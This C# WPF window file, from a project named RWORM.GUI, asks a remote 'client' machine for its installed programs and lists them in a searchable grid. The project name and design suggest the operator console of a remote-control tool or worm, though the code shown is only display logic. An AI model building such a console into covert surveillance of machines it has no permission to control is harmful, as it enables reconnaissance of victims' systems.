using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class InstalledProgramsWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string _clientId;
        private List<ProgramEntry> _allPrograms = new();

        public class ProgramEntry
        {
            public string Name { get; set; } = "";
            public string Version { get; set; } = "";
            public string Publisher { get; set; } = "";
            public string InstallDate { get; set; } = "";
        }

        public InstalledProgramsWindow(ServerConnection server, string clientId)
        {
            InitializeComponent();
            _server = server;
            _clientId = clientId;

            _server.RegisterInstalledProgramsHandler(_clientId, OnInstalledProgramsReceived);
            Closed += (s, e) => _server.UnregisterInstalledProgramsHandler(_clientId);

            LoadData();
        }

        private void LoadData()
        {
            StatusText.Text = "Querying client registry for installed programs...";
            _server.RequestInstalledPrograms(_clientId);
        }

        private void OnInstalledProgramsReceived(byte[] data)
        {
            var json = Encoding.UTF8.GetString(data);
            Dispatcher.Invoke(() =>
            {
                try
                {
                    using var doc = JsonDocument.Parse(json);
                    var list = new List<ProgramEntry>();
                    if (doc.RootElement.TryGetProperty("programs", out var progsElement) && progsElement.ValueKind == JsonValueKind.Array)
                    {
                        foreach (var el in progsElement.EnumerateArray())
                        {
                            var name = el.TryGetProperty("name", out var n) ? n.GetString() ?? "" : "";
                            var ver = el.TryGetProperty("version", out var v) ? v.GetString() ?? "" : "";
                            var pub = el.TryGetProperty("publisher", out var p) ? p.GetString() ?? "" : "";
                            var date = el.TryGetProperty("date", out var d) ? d.GetString() ?? "" : "";

                            if (!string.IsNullOrWhiteSpace(name))
                            {
                                list.Add(new ProgramEntry
                                {
                                    Name = name,
                                    Version = ver,
                                    Publisher = pub,
                                    InstallDate = date
                                });
                            }
                        }
                    }

                    _allPrograms = list.OrderBy(p => p.Name, StringComparer.OrdinalIgnoreCase).ToList();
                    ApplyFilter();
                    StatusText.Text = $"Found {_allPrograms.Count} installed programs.";
                }
                catch (Exception ex)
                {
                    StatusText.Text = $"Error parsing installed programs: {ex.Message}";
                }
            });
        }

        private void ApplyFilter()
        {
            var filter = SearchBox.Text?.Trim() ?? "";
            if (string.IsNullOrEmpty(filter))
            {
                ProgramsGrid.ItemsSource = _allPrograms;
            }
            else
            {
                ProgramsGrid.ItemsSource = _allPrograms.Where(p =>
                    p.Name.IndexOf(filter, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    p.Publisher.IndexOf(filter, StringComparison.OrdinalIgnoreCase) >= 0 ||
                    p.Version.IndexOf(filter, StringComparison.OrdinalIgnoreCase) >= 0).ToList();
            }
        }

        private void SearchBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            ApplyFilter();
        }

        private void RefreshButton_Click(object sender, RoutedEventArgs e)
        {
            LoadData();
        }
    }
}
